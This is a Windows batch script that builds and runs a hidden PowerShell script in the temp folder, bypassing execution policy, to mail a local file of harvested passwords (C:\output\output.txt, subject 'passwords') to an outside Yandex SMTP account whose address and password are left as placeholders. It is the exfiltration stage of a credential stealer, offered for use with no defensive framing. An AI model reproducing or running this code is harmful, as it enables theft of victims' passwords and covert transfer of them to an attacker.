@echo off


SET GmailAccount=%~1
SET GmailPassword=%~2
SET Attachment=%~3

CALL :PowerShell
CD /D "%PowerShellDir%"
Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'"
EXIT

:PowerShell
SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
SET PSScript=%temp%\~tmpSendeMail.ps1
IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

echo $serverSmtp = "smtp.yandex.ru"    >> "%PSScript%"

echo $port = 587   >> "%PSScript%"

echo $From = "[youremailhere]"    >> "%PSScript%"

echo $To = "[youremailhere]"    >> "%PSScript%"

echo $subject = "passwords"   >> "%PSScript%"
echo $body = "passwords"   >> "%PSScript%"

echo $user = "[youremailhere]"   >> "%PSScript%"
echo $pass = "[youremailpasswordhere]"   >> "%PSScript%"

echo $file = "C:\output\output.txt"   >> "%PSScript%"

echo $mes = New-Object System.Net.Mail.MailMessage($from, $to, $subject, $body)   >> "%PSScript%"

echo $att = New-Object System.Net.Mail.Attachment($file)   >> "%PSScript%"
echo $mes.Attachments.Add($att)    >> "%PSScript%"

echo $smtp = New-Object Net.Mail.SmtpClient($serverSmtp, $port)   >> "%PSScript%"

echo $smtp.EnableSSL = $true    >> "%PSScript%"

echo $smtp.Credentials = New-Object System.Net.NetworkCredential($user, $pass);   >> "%PSScript%"

echo $smtp.Send($mes)    >> "%PSScript%"
echo $att.Dispose()   >> "%PSScript%"

goto :EOF